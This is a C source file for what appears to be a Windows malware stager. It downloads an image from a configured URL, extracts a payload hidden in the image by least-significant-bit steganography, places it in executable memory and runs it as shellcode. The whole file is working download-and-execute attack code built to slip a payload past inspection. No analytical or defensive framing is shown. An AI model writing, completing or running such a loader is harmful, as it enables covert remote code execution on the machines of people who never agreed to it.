/*
	File for the main execution thread of the code

	This is called from the main after all of the API setup is completed. We should
	have access to core API calls required to load and perform any actions.
*/

#include "Execution.h"
#include "Stego.h"
#include "Utils.h"

BOOL RunPayload(API * api, void * payload, DWORD dwPayloadLength)
{
	if (api == NULL || payload == NULL || dwPayloadLength == 0)
	{
		return FALSE; // No payload or API, can't load it and run
	}

	// Allocate a page for our payload in memory with execution privileges
	void * exec = (void *)(api->VirtualAlloc(NULL, dwPayloadLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE));

	// Verify that our VirtualAlloc call didn't fail
	if (exec == NULL)
	{
		return FALSE; // Uh oh - VirtualAlloc failed to run
	}

	// Copy the payload into the allocated page
	memcpy(exec, payload, dwPayloadLength);

	// Call our anonymous function (payload)
	((void(*)())exec)();

	// Every was okay so far, return the result of VirtualFree (it is
	// the last action that could fail)
	// Note: If we don't call VirtualFree, our program may crash
	//	instead of exiting cleanly.
	return api->VirtualFree(exec, dwPayloadLength, MEM_RELEASE);
}

void * GetFile(API * api, HINTERNET hInternet, DWORD * dwSize)
{
	BYTE * szBuffer = NULL;
	DWORD dwBufSize = 0;

	DWORD dwBufferIndex = 0;

	BYTE temp[2048];
	DWORD dwRead = 0;

	while (api->InternetReadFile(hInternet, temp, sizeof(temp), &dwRead) == TRUE && dwRead != 0)
	{
		szBuffer = (BYTE *)resize(szBuffer, dwBufSize, dwBufSize + dwRead);

		if (szBuffer == NULL)
		{
			(*dwSize) = 0;
			return NULL; // ERROR - must have had issues with resizing
		}

		memcpy(szBuffer + dwBufSize, temp, dwRead); // our dwBufSize keeps track of where in the buffer we should be writing

		dwBufSize += dwRead; // Add bytes read to our buffers current size
	}

	(*dwSize) = dwBufSize; // set the buffer size

	return (void *)szBuffer;
}

int execution(API * api)
{
	/*
		Steps to execute:
			1. Download picture file from internet
			2. Pull out stego-encoded data
			3. Allocate executable memory for the data
			4. Copy data to the allocated memory
			5. Execute the copied payload
	*/
	HINTERNET hInternet = api->InternetOpenA(USER_AGENT, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	BOOL bResult = FALSE;

	DWORD dwRequestFlags = INTERNET_FLAG_NO_UI   // no UI please
		| INTERNET_FLAG_NO_AUTH           // don't authenticate
		| INTERNET_FLAG_PRAGMA_NOCACHE    // do not try the cache or proxy
		| INTERNET_FLAG_NO_CACHE_WRITE;   // don't add this to the IE cache

	HINTERNET hFile = api->InternetOpenUrlA(hInternet, LSB_TARGET_URL, NULL, 0, dwRequestFlags, NULL);
	
	if (hFile != NULL)
	{
		DWORD dwDataSize = 0;
		unsigned char * pData = (unsigned char *)GetFile(api, hFile, &dwDataSize);

		// Check that we were able to snag the downloaded file without any issues
		if (pData != NULL && dwDataSize > 0)
		{
			LSBHeader * pLSBHeader = GetLSBHeader(pData, dwDataSize, LSB_HEADER_OFFSET);
			void * payload = GetLSBPayload(pData, dwDataSize, pLSBHeader->PayloadSize, LSB_PAYLOAD_OFFSET);

			RunPayload(api, payload, pLSBHeader->PayloadSize);

			free(pLSBHeader);
			free(payload);
		}
		
		free(pData);
		api->InternetCloseHandle(hFile);
	}

	api->InternetCloseHandle(hInternet);

	return 0;
}